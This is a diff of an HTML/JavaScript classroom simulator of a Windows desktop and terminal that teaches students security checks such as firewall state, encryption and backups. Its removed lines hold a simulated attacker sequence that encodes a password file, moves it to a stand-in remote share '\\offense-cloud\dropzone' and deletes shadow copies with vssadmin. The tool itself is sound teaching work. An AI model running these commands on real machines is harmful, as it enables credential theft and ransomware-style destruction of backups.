+          "output": "Current LogonId is 0:0x3e7fa\n\nCached Tickets: (2)\n\n#0>  Client: student @ MEGACORP.LOCAL\n     Server: krbtgt/MEGACORP.LOCAL\n     KerbTicket Encryption Type: AES-256\n     Start Time: 9/26/2026 8:02:30\n     End Time:   9/26/2026 18:02:30",
+          "title": "See your active login tickets",
+          "whatItDoes": "This shows the tickets that prove you already signed in, so you can reach network resources without logging in again each time."
+        },
+        {
+          "type": "command",
+          "command": "query session",
+          "output": " SESSIONNAME    USERNAME     ID  STATE   TYPE        DEVICE\n>console        student       1  Active\n rdp-tcp                   65536  Listen\n services                      0  Disc",
+          "title": "See active login sessions",
+          "whatItDoes": "This shows the sign-in sessions on the computer. Checking sessions helps confirm only expected people are connected."
+        }
+      ],
+      "outro": "<b>Lab complete!</b><br><br>You explored authentication — how the computer proves who you are. You looked at account IDs, password rules, saved credentials, and login tickets.<br><br>Strong, unique passwords and multi-factor sign-in make these checks much harder to fake."
+    },
+    {
+      "id": "CMDLAB-06",
+      "number": 6,
+      "title": "CYBER CMD LAB-6",
+      "topic": "Network Safety",
+      "info": "Check that your network's front door is locked: firewall state, connectivity to the router, adapter info and Wi-Fi security.",
+      "steps": [
+        {
+          "type": "command",
+          "command": "netsh advfirewall show allprofiles",
+          "output": "Domain Profile Settings:\n----------------------------------------------------------------------\nState                                 ON\nFirewall Policy                       BlockInbound,AllowOutbound\n\nPrivate Profile Settings:\n----------------------------------------------------------------------\nState                                 ON\n\nPublic Profile Settings:\n----------------------------------------------------------------------\nState                                 ON",
+          "title": "Check the firewall",
+          "whatItDoes": "This shows whether the Windows firewall is turned on for each type of network. \"ON\" everywhere is what you want."
+        },
+        {
+          "type": "command",
+          "command": "getmac",
+          "output": "Physical Address    Transport Name\n=================== ==========================================================\n00-1A-2B-3C-4D-5E   \\Device\\Tcpip_{9F2C-A1B2}\n02-AC-13-90-7B-11   Media disconnected",
+          "title": "See hardware addresses",
+          "whatItDoes": "This shows the unique hardware address of each network adapter in the computer."
+        },
+        {
+          "type": "command",
+          "command": "ping 192.168.1.1",
+          "output": "Pinging 192.168.1.1 with 32 bytes of data:\nReply from 192.168.1.1: bytes=32 time=1ms TTL=64\nReply from 192.168.1.1: bytes=32 time=1ms TTL=64\n\nPing statistics for 192.168.1.1:\n    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss)",
+          "title": "Test the connection to the router",
+          "whatItDoes": "This checks whether your computer can reach the router and how quickly the reply comes back."
+        },
+        {
+          "type": "command",
+          "command": "tracert 192.168.1.1",
+          "output": "Tracing route to 192.168.1.1 over a maximum of 30 hops\n\n  1    <1 ms    <1 ms    <1 ms  192.168.1.1\n\nTrace complete.",
+          "title": "Trace the path to the router",
+          "whatItDoes": "This shows each step (hop) your data takes to reach a destination. Unexpected hops can reveal traffic being redirected."
+        },
+        {
+          "type": "command",
+          "command": "netsh wlan show interfaces",
+          "output": "There is 1 interface on the system:\n\n    Name                   : Wi-Fi\n    State                  : connected\n    SSID                   : HomeNetwork\n    Signal                 : 92%\n    Authentication         : WPA2-Personal",
+          "title": "See current Wi-Fi details",
+          "whatItDoes": "This shows details of your current Wi-Fi connection, including how it is secured (WPA2/WPA3 is good; open networks are risky)."
+        },
+        {
+          "type": "command",
+          "command": "netstat -rn",
+          "output": "IPv4 Route Table\n===========================================================================\nNetwork Destination        Netmask          Gateway       Interface  Metric\n          0.0.0.0          0.0.0.0      192.168.1.1   192.168.1.42     35\n      192.168.1.0    255.255.255.0         On-link    192.168.1.42    291\n===========================================================================",
+          "title": "See the routing table",
+          "whatItDoes": "This shows the map your computer uses to decide where to send network traffic."
+        }
+      ],
+      "outro": "<b>Lab complete!</b><br><br>You checked the basics of network safety: firewall status, hardware addresses, connectivity to the router, and how your Wi-Fi is secured.<br><br>A firewall that's on and a WPA2/WPA3 network are two simple wins for staying safe."
+    },
+    {
+      "id": "CMDLAB-07",
+      "number": 7,
+      "title": "CYBER CMD LAB-7",
+      "topic": "System Health & Backup",
+      "info": "A quick system health check-up: version, disk space, disk errors and drivers — the basics that keep a machine secure and stable.",
+      "steps": [
+        {
+          "type": "command",
+          "command": "systeminfo",
+          "output": "Host Name:                 STUDENT-PC01\nOS Name:                   Microsoft Windows 11 Pro\nOS Version:                10.0.22631 N/A Build 22631\nSystem Manufacturer:       Contoso Inc.\nTotal Physical Memory:     16,301 MB",
+          "title": "See a system overview",
+          "whatItDoes": "This gives a summary of the computer: its name, Windows version, and memory. Handy for checking updates and support."
+        },
+        {
+          "type": "command",
+          "command": "ver",
+          "output": "Microsoft Windows [Version 10.0.22631.4460]",
+          "title": "See the Windows version",
+          "whatItDoes": "This prints the exact Windows version. Old versions may be missing important security fixes."
+        },
+        {
+          "type": "command",
+          "command": "vol C:",
+          "output": " Volume in drive C has no label.\n Volume Serial Number is 9C4F-1A2B",
+          "title": "See the drive's label and serial",
+          "whatItDoes": "This shows the name and serial number of a drive."
+        },
+        {
+          "type": "command",
+          "command": "fsutil volume diskfree C:",
+          "output": "Total free bytes         :  128,394,821,632 (119.5 GB)\nTotal bytes              :  510,838,833,152 (475.7 GB)\nTotal quota free bytes   :  128,394,821,632 (119.5 GB)",
+          "title": "See free disk space",
+          "whatItDoes": "This shows how much space is free on a drive. Low space can stop backups and updates from working."
+        },
+        {
+          "type": "command",
+          "command": "chkdsk C: /scan",
+          "output": "The type of the file system is NTFS.\n\nStage 1: Examining basic file system structure ...\n  Progress: 100% done.\nWindows has scanned the file system and found no problems.\nNo further action is required.",
+          "title": "Check the disk for errors",
+          "whatItDoes": "This checks the drive for errors without changing anything. Regular checks help catch problems early."
+        },
+        {
+          "type": "command",
+          "command": "driverquery",
+          "output": "Module Name  Display Name           Driver Type   Link Date\n============ ====================== ============= ======================\ndisk         Disk Driver            Kernel        6/12/2026 3:22:10 AM\ntcpip        TCP/IP Protocol Driver Kernel        6/12/2026 3:22:10 AM\nWdf01000     Kernel Mode Driver Fw  Kernel        6/12/2026 3:22:10 AM",
+          "title": "List installed drivers",
+          "whatItDoes": "This lists the drivers that let Windows talk to hardware. Unknown or outdated drivers can be a security risk."
+        }
+      ],
+      "outro": "<b>Lab complete!</b><br><br>You ran a quick system health check: version info, disk space, disk errors, and installed drivers.<br><br>Keeping Windows updated and disks healthy prevents many security and reliability problems."
+    },
+    {
+      "id": "CMDLAB-08",
+      "number": 8,
+      "title": "CYBER CMD LAB-8",
+      "topic": "Data Protection",
+      "info": "Protect the data itself: drive and file encryption, safe backup previews, available backups, and securely wiping deleted files.",
+      "steps": [
+        {
+          "type": "command",
+          "command": "manage-bde -status C:",
+          "output": "BitLocker Drive Encryption: Volume C: [OS]\n    Size:                 475.71 GB\n    BitLocker Version:    2.0\n    Conversion Status:    Fully Encrypted\n    Encryption Method:    XTS-AES 128\n    Protection Status:    Protection On",
+          "title": "Check drive encryption",
+          "whatItDoes": "This shows whether the drive is scrambled (encrypted) so its data can't be read if the computer is lost or stolen. \"Protection On\" is good."
+        },
+        {
+          "type": "command",
+          "command": "cipher \"Desktop\\Documents\"",
+          "output": " Listing C:\\Users\\Student\\Desktop\\Documents\\\n New files added to this directory will not be encrypted.\n\nU Employee_Handbook.docx\nU Q3_Budget_Report.xlsx\nE VPN_Setup_Guide.pdf",
+          "title": "See which files are encrypted",
+          "whatItDoes": "This shows which files are encrypted (E) and which are not (U). Sensitive files are safer when encrypted."
+        },
+        {
+          "type": "command",
+          "command": "robocopy \"Desktop\\Documents\" \"Desktop\\Backup\" /e /l",
+          "output": "-------------------------------------------------------------------------------\n   ROBOCOPY     ::     Robust File Copy for Windows\n-------------------------------------------------------------------------------\n\n  Source : C:\\Users\\Student\\Desktop\\Documents\\\n    Dest : C:\\Users\\Student\\Desktop\\Backup\\\n\n    New File          Employee_Handbook.docx\n    New File          Q3_Budget_Report.xlsx\n    New File          VPN_Setup_Guide.pdf\n\n               (Listing only - no files were copied)",
+          "title": "Preview a backup (no changes)",
+          "whatItDoes": "This previews a backup: with the /l switch it only lists what would be copied, without changing anything. Good for planning a safe backup."
+        },
+        {
+          "type": "command",
+          "command": "wbadmin get versions",
+          "output": "wbadmin 1.0 - Backup command-line tool\n(C) Microsoft Corporation. All rights reserved.\n\nBackup time: 9/20/2026 2:00 AM\nBackup target: Network Share labeled \\\\backup-srv\\vault\nVersion identifier: 09/20/2026-02:00\nCan recover: Volume(s), File(s), Folder(s)",
+          "title": "See available system backups",
+          "whatItDoes": "This lists the backups you can restore from. Knowing you have recent backups is the best defense against data loss and ransomware."
+        },
+        {
+          "type": "command",
+          "command": "cipher /w:\"Desktop\\Temp\"",
+          "output": "To remove as much data as possible, please close all other applications.\n\nWriting 0x00\n...........\nWriting 0xFF\n...........\nWriting Random Numbers\n...........",
+          "title": "Securely wipe leftover deleted data",
+          "whatItDoes": "This overwrites the empty space on a drive so files you deleted earlier can't be recovered. Useful before giving a computer away."
+        },
+        {
+          "type": "command",
+          "command": "fsutil dirty query C:",
+          "output": "Volume C: is NOT Dirty",
+          "title": "Check the drive's health flag",
+          "whatItDoes": "This checks whether a drive is flagged as needing a repair scan. \"NOT Dirty\" means the drive is healthy."
+        }
+      ],
+      "outro": "<b>Lab complete!</b><br><br>You explored data protection: drive encryption, file encryption status, safe backup previews, available backups, and securely wiping deleted data.<br><br>Encryption plus good backups is the strongest protection against theft and ransomware."
+    }
+  ]
+}</script>
 
 <script>
 (function(){
+
+const $ = s=>document.querySelector(s);
 
 /* ---------------- ICONS (reused as strings) ---------------- */
 const ICO = {
@@ -413,9 +1036,7 @@ const FILE_KIND_LABEL = {
   pdf:'PDF Document', img:'Image', exe:'Application', txt:'Text Document'
 };
 
-/* ---------------- DESKTOP FOLDER CONTENTS ----------------
-   Every filename below appears in exactly one folder — nothing is duplicated
-   across folders, matching a real, tidy (if slightly messy) user profile. */
+/* ---------------- DESKTOP FOLDER CONTENTS ---------------- */
 const FOLDERS = {
   myfiles: { title:'My Files', files:[
     {name:'Passwords_Backup.txt', type:'txt', size:'2 KB',   date:'3/14/2026 9:12 AM'},
@@ -444,97 +1065,7 @@ const FOLDERS = {
   ]}
 };
 
-/* ---------------- PHASE 2: SIMULATED OFFENSE ON "MY FILES" ----------------
-   Real Windows / built-in commands, mapped loosely to MITRE ATT&CK for
-   context. Everything here runs only inside the fake terminal above —
-   no real file, network, or system is ever touched. */
-const OFFENSE_CMDS = [
-  {
-    command:'dir "Desktop\\My Files"',
-    output:
-` Volume in drive C has no label.
- Directory of C:\\Users\\Student\\Desktop\\My Files
-
-09/03/2026  09:12 AM             2,048 Passwords_Backup.txt
-02/02/2026  04:47 PM            49,152 Resume_JohnDoe.docx
-11/30/2025  08:03 AM             6,144 Old_Notes.txt
-               3 File(s)         57,344 bytes`,
-    title:'Look inside the folder',
-    whatItDoes:'This shows every file inside the <b>My Files</b> folder.',
-    effect:'compromise-myfiles'
-  },
-  {
-    command:'cd "Desktop\\My Files"',
-    output:'',
-    title:'Step into the folder',
-    whatItDoes:'This moves you inside the <b>My Files</b> folder, so the next commands work on it directly.',
-    effect:'open-myfiles'
-  },
-  {
-    command:'dir /a',
-    output:
-` Directory of C:\\Users\\Student\\Desktop\\My Files
-
-09/03/2026  09:12 AM             2,048 Passwords_Backup.txt
-02/02/2026  04:47 PM            49,152 Resume_JohnDoe.docx
-11/30/2025  08:03 AM             6,144 Old_Notes.txt
-09/01/2026  07:40 AM               512 ~cache.tmp          [Hidden]
-               4 File(s)         57,856 bytes`,
-    title:'Look for hidden files',
-    whatItDoes:'This also shows files that are normally hidden from view.'
-  },
-  {
-    command:'attrib -h -r -s Passwords_Backup.txt',
-    output:'',
-    title:'Unlock the file',
-    whatItDoes:'This removes the file\'s hidden, read-only, and protected settings so it can be changed.'
-  },
-  {
-    command:'ren Passwords_Backup.txt Passwords_Backup.dat',
-    output:'',
-    title:'Rename the file',
-    whatItDoes:'This changes the file\'s name and extension, so it looks different.'
-  },
-  {
-    command:'certutil -encode Passwords_Backup.dat Passwords_Backup.enc',
-    output:
-`Input Length = 2048
-Output Length = 2840
-CertUtil: -encode command completed successfully.`,
-    title:'Scramble the file',
-    whatItDoes:'This turns the file into a jumbled version that\'s harder to read. It can still be un-scrambled easily — it is not the same as strong, real encryption.'
-  },
-  {
-    command:'del Passwords_Backup.dat',
-    output:'',
-    title:'Delete the old copy',
-    whatItDoes:'This removes the readable copy, so only the scrambled version is left.'
-  },
-  {
-    command:'net use Z: \\\\offense-cloud\\dropzone',
-    output:'The command completed successfully.',
-    title:'Connect to an outside drive',
-    whatItDoes:'This connects your computer to a remote storage location, shown here as drive <b>Z</b>.'
-  },
-  {
-    command:'move Passwords_Backup.enc Z:\\',
-    output:'        1 file(s) moved.',
-    title:'Send the file out',
-    whatItDoes:'This moves the scrambled file from this computer onto the outside drive.'
-  },
-  {
-    command:'vssadmin delete shadows /all /quiet',
-    output:
-`vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
-(C) Microsoft Corporation. All rights reserved.
-
-Successfully deleted 3 shadow copies.`,
-    title:'Delete the backup copies',
-    whatItDoes:'This removes Windows\' built-in backup snapshots, so the file can\'t easily be restored.'
-  }
-];
-
-/* ---------------- PINNED APPS ---------------- */
+/* ---------------- PINNED APPS (launcher decoys) ---------------- */
 const APPS = [
   {name:'Microsoft Edge', icon:ICO.edge, keywords:['edge','browser']},
   {name:'File Explorer', icon:ICO.explorer, keywords:['explorer','files']},
@@ -547,129 +1078,21 @@ const APPS = [
   {name:'Command Prompt', icon:ICO.cmd, keywords:['cmd','command','command prompt','terminal','console'], isCmd:true}
 ];
 
-/* ---------------- TERMINAL "COMMAND" STEPS ---------------- */
-const CMDS = [
-  {
-    command:'ipconfig /all',
-    output:
-`Windows IP Configuration
+/* ---------------- LAB DATA (from embedded JSON) ---------------- */
+const LAB_DATA = JSON.parse(document.getElementById('lab-data').textContent);
+const INTRO_STEPS = LAB_DATA.introSteps;
 
-   Host Name . . . . . . . . . . . . : STUDENT-PC01
-   Primary Dns Suffix  . . . . . . . :
-   Node Type . . . . . . . . . . . . : Hybrid
-   IP Routing Enabled. . . . . . . . : No
-
-Ethernet adapter Ethernet:
-
-   Description . . . . . . . . . . . : Intel(R) Ethernet Connection
-   Physical Address. . . . . . . . . : 00-1A-2B-3C-4D-5E
-   DHCP Enabled. . . . . . . . . . . : Yes
-   IPv4 Address. . . . . . . . . . . : 192.168.1.42(Preferred)
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 192.168.1.1`,
-    title:'Check your computer\'s address',
-    whatItDoes:'This shows your computer\'s IP address and the network it\'s connected to.'
-  },
-  {
-    command:'arp -a',
-    output:
-`Interface: 192.168.1.42 --- 0xb
-  Internet Address      Physical Address      Type
-  192.168.1.1           aa-bb-cc-00-11-22     dynamic
-  192.168.1.10          aa-bb-cc-00-11-45     dynamic
-  192.168.1.23          aa-bb-cc-00-11-9f     dynamic`,
-    title:'See other devices nearby',
-    whatItDoes:'This shows other computers that yours has recently talked to on the same network.'
-  },
-  {
-    command:'netstat -ano',
-    output:
-`Proto  Local Address        Foreign Address      State        PID
-TCP    192.168.1.42:49721   93.184.216.34:443    ESTABLISHED  4120
-TCP    192.168.1.42:139     0.0.0.0:0            LISTENING    4
-TCP    0.0.0.0:3389         0.0.0.0:0            LISTENING    892`,
-    title:'See open connections',
-    whatItDoes:'This shows what your computer is currently connected to, and which program is using each connection.'
-  },
-  {
-    command:'tasklist',
-    output:
-`Image Name              PID   Session Name   Mem Usage
-========================= ===== ============== ============
-System Idle Process        0    Services         8 K
-svchost.exe               892    Services      12,344 K
-explorer.exe             4356    Console       55,120 K`,
-    title:'See running programs',
-    whatItDoes:'This lists every program currently running on the computer, with its ID number.'
-  },
-  {
-    command:'nslookup megacorp.local',
-    output:
-`Server:  UnKnown
-Address:  192.168.1.1
-
-Name:    megacorp.local
-Address: 192.168.1.10`,
-    title:'Find a website\'s address',
-    whatItDoes:'This looks up the real address (IP) behind a name like megacorp.local.'
-  },
-  {
-    command:'netsh wlan show profiles',
-    output:
-`Profiles on interface Wi-Fi:
-
-Group policy profiles (read only)
-----------------------------------
-    (none)
-
-User profiles
---------------
-    All User Profile     : HomeNetwork
-    All User Profile     : CoffeeShop-Guest`,
-    title:'See saved Wi-Fi networks',
-    whatItDoes:'This lists every Wi-Fi network this computer has connected to before.'
-  },
-  {
-    command:'whoami /priv',
-    output:
-`PRIVILEGES INFORMATION
-----------------------
-Privilege Name                Description                       State
-============================= ================================= ========
-SeShutdownPrivilege           Shut down the system              Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking           Enabled
-SeUndockPrivilege             Remove computer from docking st.  Disabled`,
-    title:'Check your own permissions',
-    whatItDoes:'This shows what special powers your current user account has on this computer.'
-  }
-];
-
-/* ---------------- BUILD TUTORIAL STEP LIST ---------------- */
-const steps = [
-  {type:'click', target:'#start-button', instruction:'Click the <b>Start button</b> (the Windows logo) on the taskbar.'},
-  {type:'type', target:'#start-search', expected:'cmd', instruction:'Type <b>cmd</b> into the search box that just opened.'},
-  {type:'click', target:'#search-result-cmd', instruction:'Click <b>Command Prompt</b> in the search results to open it.'}
-];
-CMDS.forEach((c,i)=>{
-  steps.push({type:'command', command:c.command, output:c.output, title:c.title, whatItDoes:c.whatItDoes,
-    instruction:'Click inside the terminal, type the command below, then press <b>Enter</b>.'});
-});
-steps.push({
-  type:'info',
-  instruction:'Nice work! Now let\'s switch roles. Act like an attacker and go after the <b>My Files</b> folder, using the same terminal.'
-});
-OFFENSE_CMDS.forEach(c=>{
-  steps.push({type:'command', command:c.command, output:c.output, title:c.title, whatItDoes:c.whatItDoes, effect:c.effect,
-    instruction:'Click inside the terminal, type the command below, then press <b>Enter</b>.'});
-});
-steps.push({type:'end', instruction:'Module complete.'});
-
+/* ---------------- STATE ---------------- */
+let steps = [];
+let currentLab = null;
 let stepIndex = 0;
 let startMenuOpen = false;
 let cmdOpen = false;
+let activeInput = null;
+let currentPromptPath = 'C:\\Users\\Student';
+let screenshots = [];   // {img, label} captured after each command
 
 /* ---------------- DOM REFS ---------------- */
-const $ = s=>document.querySelector(s);
 const startMenu = $('#start-menu');
 const startBtn = $('#start-button');
 const searchInput = $('#start-search');
@@ -679,6 +1102,12 @@ const pinnedLabel = $('#pinned-label');
 const cmdWindow = $('#cmd-window');
 const cmdBody = $('#cmd-body');
 const cmdTaskBtn = $('#cmd-taskbtn');
+const explorerWindow = $('#explorer-window');
+const explorerTitle = $('#explorer-title');
+const explorerBreadcrumb = $('#explorer-breadcrumb');
+const explorerList = $('#explorer-list');
+const startOverlay = $('#start-overlay');
+const cardsGrid = $('#cards-grid');
 const tpInstruction = $('#tp-instruction');
 const tpFeedback = $('#tp-feedback');
 const tpContinue = $('#tp-continue');
@@ -686,6 +1115,10 @@ const tpStepCount = $('#tp-step-count');
 const tpProgressBar = $('#tp-progress-bar');
 const tpDoneBadge = $('#tp-done-badge');
 const tpRestart = $('#tp-restart');
+const tpBack = $('#tp-back');
+const tpLabName = $('#tp-labname');
+const tpPdf = $('#tp-pdf');
+const pdfModal = $('#pdf-modal');
 
 /* ---------------- RENDER PINNED APPS ---------------- */
 APPS.forEach(app=>{
@@ -695,6 +1128,99 @@ APPS.forEach(app=>{
   tile.addEventListener('click', ()=> launchApp(app));
   pinnedGrid.appendChild(tile);
 });
+
+/* ---------------- FLIP-CARD LANDING ---------------- */
+function renderCards(){
+  cardsGrid.innerHTML='';
+  LAB_DATA.labs.forEach(lab=>{
+    const card = document.createElement('div');
+    card.className='flip-card';
+    card.dataset.lab = lab.id;
+    card.innerHTML = `
+      <div class="flip-inner">
+        <div class="flip-front">
+          <div class="fc-num">${lab.id}</div>
+          <div class="fc-badge">LAB ${lab.number}</div>
+          <div class="fc-title">${lab.title}</div>
+          <div class="fc-topic">${lab.topic}</div>
+          <div class="fc-hint">hover / tap to flip</div>
+        </div>
+        <div class="flip-back">
+          <div>
+            <div class="fc-back-id">${lab.id}</div>
+            <div class="fc-back-title">${lab.topic}</div>
+          </div>
+          <div class="fc-info">${lab.info}</div>
+          <button class="fc-start" type="button">Ready to Start &#9654;</button>
+        </div>
+      </div>`;
+    // front-face click flips to reveal info + Start (works on touch)
+    card.addEventListener('click', e=>{
+      if(e.target.closest('.fc-start')) return;
+      card.classList.toggle('flipped');
+    });
+    // Start button loads this lab's JSON steps + right panel
+    card.querySelector('.fc-start').addEventListener('click', e=>{
+      e.stopPropagation();
+      startLab(lab.id);
+    });
+    cardsGrid.appendChild(card);
+  });
+}
+
+/* ---------------- BUILD + START A LAB ---------------- */
+function buildSteps(lab){
+  const intro = INTRO_STEPS.map(s=>Object.assign({}, s));
+  const body  = lab.steps.map(s=>Object.assign({}, s));
+  return [...intro, ...body, {type:'end'}];
+}
+
+async function startLab(labId){
+  const lab = LAB_DATA.labs.find(l=>l.id===labId);
+  if(!lab) return;
+  currentLab = lab;
+  steps = buildSteps(lab);
+  resetLabEnvironment();
+  tpLabName.textContent = lab.title;
+  startOverlay.style.display='none';
+  renderTutorial();
+  const el = document.documentElement;
+  try{
+    if(el.requestFullscreen){ await el.requestFullscreen(); }
+    else if(el.webkitRequestFullscreen){ await el.webkitRequestFullscreen(); }
+    else if(el.msRequestFullscreen){ await el.msRequestFullscreen(); }
+  }catch(err){ /* fullscreen may be blocked; continue windowed */ }
+}
+
+function backToLabs(){
+  resetLabEnvironment();
+  startOverlay.style.display='flex';
+  document.querySelectorAll('.flip-card').forEach(c=>c.classList.remove('flipped'));
+}
+
+function resetLabEnvironment(){
+  stepIndex = 0;
+  // terminal
+  cmdOpen = false;
+  cmdWindow.classList.remove('show');
+  cmdWindow.style.left=''; cmdWindow.style.top=''; cmdWindow.style.marginLeft='-370px'; cmdWindow.style.margin='';
+  cmdTaskBtn.style.display='none';
+  cmdBody.innerHTML='';
+  delete cmdBody.dataset.inited;
+  activeInput = null;
+  currentPromptPath = 'C:\\Users\\Student';
+  // explorer
+  explorerWindow.classList.remove('show');
+  explorerWindow.style.left=''; explorerWindow.style.top=''; explorerWindow.style.margin='';
+  // compromised flags
+  document.querySelectorAll('.folder-compromised').forEach(el=>el.classList.remove('folder-compromised'));
+  // report state
+  screenshots.length = 0;
+  if(pdfModal) pdfModal.classList.remove('show');
+  // start menu
+  toggleStartMenu(false);
+  clearHighlights();
+}
 
 /* ---------------- HIGHLIGHTING ---------------- */
 function clearHighlights(){
@@ -748,11 +1274,11 @@ function renderSearchResults(query){
     tag.className='best-match-tag';
     tag.textContent='Best match';
     searchResults.appendChild(tag);
-    matches.slice(0,5).forEach((app,idx)=>{
+    matches.slice(0,5).forEach((app)=>{
       const row = document.createElement('div');
       row.className='result-row';
       if(app.isCmd) row.id='search-result-cmd';
-      row.innerHTML = `${app.icon}<div><div class="r-main">${app.name}</div><div class="r-sub">${idx===0?'App':'App'}</div></div>`;
+      row.innerHTML = `${app.icon}<div><div class="r-main">${app.name}</div><div class="r-sub">App</div></div>`;
       row.addEventListener('click', ()=> launchApp(app));
       searchResults.appendChild(row);
     });
@@ -774,7 +1300,6 @@ function launchApp(app){
     openCmd();
     toggleStartMenu(false);
   } else {
-    // decoy apps: just close the menu, no real window (out of scope for the lab)
     toggleStartMenu(false);
   }
 }
@@ -829,8 +1354,6 @@ function addOutputLine(text, cls){
   cmdBody.scrollTop = cmdBody.scrollHeight;
 }
 
-let activeInput=null;
-let currentPromptPath = 'C:\\Users\\Student';
 function newPromptLine(){
   const row = document.createElement('div');
   row.className='prompt-row';
@@ -855,7 +1378,6 @@ function newPromptLine(){
 function handleEnter(raw){
   const typed = raw.trim();
   activeInput.disabled = true;
-  // echo what was typed as plain text on its own frozen row
   const frozen = document.createElement('div');
   frozen.className='line cmd-echo';
   frozen.textContent = currentPromptPath + '> ' + typed;
@@ -868,6 +1390,7 @@ function handleEnter(raw){
       addOutputLine('');
       newPromptLine();
       if(st.effect) applyEffect(st.effect);
+      setTimeout(()=>captureScreenshot(st.command), 160);
       advance(500);
     } else if(typed===''){
       newPromptLine();
@@ -878,9 +1401,106 @@ function handleEnter(raw){
       newPromptLine();
     }
   } else {
-    // no active command step (e.g. tutorial finished) - just behave like a normal echo
     addOutputLine('');
     newPromptLine();
+  }
+}
+
+/* ---------------- SCREENSHOT CAPTURE ---------------- */
+async function captureScreenshot(label){
+  if(typeof html2canvas==='undefined') return;   // offline / lib not loaded
+  const panel = $('#tutorial-panel');
+  const toast = $('#toast');
+  const prevPanel = panel.style.visibility;
+  const prevToast = toast.style.visibility;
+  panel.style.visibility='hidden';   // keep shots focused on desktop + cmd + folders
+  toast.style.visibility='hidden';
+  const glow = [...document.querySelectorAll('.tutorial-target')];
+  glow.forEach(e=>e.classList.remove('tutorial-target'));
+  try{
+    const canvas = await html2canvas(document.getElementById('desktop'), {
+      backgroundColor:'#0a1a30', logging:false, scale:1, useCORS:true
+    });
+    screenshots.push({ img: canvas.toDataURL('image/jpeg', 0.82), label: label||'' });
+  }catch(err){ /* ignore capture errors */ }
+  panel.style.visibility = prevPanel || '';
+  toast.style.visibility = prevToast || '';
+  refreshHighlightForCurrentStep();
+}
+
+/* ---------------- PDF REPORT ---------------- */
+function openPdfModal(){
+  $('#pm-status').textContent='';
+  pdfModal.classList.add('show');
+  setTimeout(()=>{ const n=$('#pm-name'); if(n) n.focus(); }, 60);
+}
+function closePdfModal(){ pdfModal.classList.remove('show'); }
+
+function generatePDF(name, sid, grade){
+  const status = $('#pm-status');
+  if(!window.jspdf || !window.jspdf.jsPDF){
+    status.textContent='PDF library not loaded — open this file with an internet connection and try again.';
+    return;
+  }
+  if(!screenshots.length){
+    status.textContent='No screenshots were captured for this lab.';
+    return;
+  }
+  status.textContent='Building PDF…';
+  try{
+    const { jsPDF } = window.jspdf;
+    const doc = new jsPDF({unit:'mm', format:'a4', orientation:'portrait'});
+    const pageW=210, pageH=297, margin=15;
+    let y = margin + 4;
+
+    // Heading
+    doc.setFont('helvetica','bold'); doc.setFontSize(20); doc.setTextColor(15,50,79);
+    doc.text('COMMAND BASED CYBER LAB', pageW/2, y, {align:'center'}); y+=10;
+
+    // Day, Date, Time
+    const now = new Date();
+    const dayName = now.toLocaleDateString('en-US',{weekday:'long'});
+    const dateStr = now.toLocaleDateString('en-US',{year:'numeric', month:'long', day:'numeric'});
+    const timeStr = now.toLocaleTimeString('en-US');
+    doc.setFont('helvetica','normal'); doc.setFontSize(11); doc.setTextColor(60);
+    doc.text(`${dayName}  |  ${dateStr}  |  ${timeStr}`, pageW/2, y, {align:'center'}); y+=8;
+
+    // Student Name, SID, Grade — single line
+    doc.setFont('helvetica','bold'); doc.setFontSize(11); doc.setTextColor(20);
+    doc.text(`Student Name: ${name||'-'}     SID: ${sid||'-'}     Grade: ${grade||'-'}`, pageW/2, y, {align:'center'}); y+=7;
+
+    doc.setFont('helvetica','normal'); doc.setFontSize(9.5); doc.setTextColor(110);
+    doc.text(`${currentLab.id} — ${currentLab.topic}`, pageW/2, y, {align:'center'}); y+=5;
+    doc.setDrawColor(200); doc.line(margin, y, pageW-margin, y); y+=7;
+    doc.setTextColor(0);
+
+    // Screenshots — 2 per page
+    const imgW = pageW - 2*margin;
+    const capH = 6;
+    let count = 0;
+    for(let i=0;i<screenshots.length;i++){
+      const sh = screenshots[i];
+      const props = doc.getImageProperties(sh.img);
+      const imgH = imgW * (props.height/props.width);
+      const need = imgH + capH;
+      if(count===2 || (y + need > pageH - margin)){
+        doc.addPage(); y = margin; count = 0;
+      }
+      doc.addImage(sh.img, 'JPEG', margin, y, imgW, imgH);
+      doc.setDrawColor(210); doc.rect(margin, y, imgW, imgH);
+      doc.setFontSize(8); doc.setTextColor(110);
+      doc.text(`${i+1}.  ${sh.label}`, margin, y + imgH + 4);
+      doc.setTextColor(0);
+      y += need + 3;
+      count++;
+    }
+
+    const safe = (sid || name || 'report').replace(/[^\w\-]+/g,'_');
+    doc.save(`Cyber_Lab_${currentLab.id}_${safe}.pdf`);
+    status.textContent='Done! Your PDF has been downloaded.';
+    setTimeout(closePdfModal, 900);
+  }catch(err){
+    status.textContent='Sorry, something went wrong building the PDF.';
   }
 }
 
@@ -911,15 +1531,17 @@ function renderTutorial(){
   tpContinue.style.display='none';
   tpDoneBadge.style.display='none';
   tpRestart.style.display='none';
+  tpPdf.style.display='none';
 
   const totalMain = steps.length-1;
   tpStepCount.textContent = `Step ${Math.min(stepIndex+1,totalMain)} of ${totalMain}`;
   tpProgressBar.style.width = Math.min(100,(stepIndex/totalMain)*100)+'%';
 
   if(st.type==='end'){
-    tpInstruction.innerHTML = `<b>Great work — lab complete!</b><br><br>First, you looked around a computer and its network (recon).<br><br>Then, you acted like an attacker: you found a folder, changed and scrambled a file, sent it to an outside drive, and deleted the backup copies.<br><br>Only ever try commands like these on a computer or network you own, or have clear permission to test.`;
+    tpInstruction.innerHTML = (currentLab && currentLab.outro) ? currentLab.outro : '<b>Lab complete!</b>';
     tpProgressBar.style.width='100%';
     tpDoneBadge.style.display='block';
+    tpPdf.style.display = screenshots.length ? 'block' : 'none';
     tpRestart.style.display='block';
     clearHighlights();
     return;
@@ -946,7 +1568,7 @@ function renderTutorial(){
 
     const instrEl = document.createElement('div');
     instrEl.style.margin = '10px 0 2px';
-    instrEl.innerHTML = st.instruction;
+    instrEl.innerHTML = 'Click inside the terminal, type the command below, then press <b>Enter</b>.';
     tpInstruction.appendChild(instrEl);
 
     const chip = document.createElement('div');
@@ -959,15 +1581,9 @@ function renderTutorial(){
   refreshHighlightForCurrentStep();
 }
 
-function showCommandFeedback(st){
-  tpFeedback.style.display='block';
-  tpFeedback.className='';
-  tpFeedback.innerHTML = st.whatItDoes;
-  clearHighlights();
-}
-
 tpContinue.addEventListener('click', ()=> advance(0));
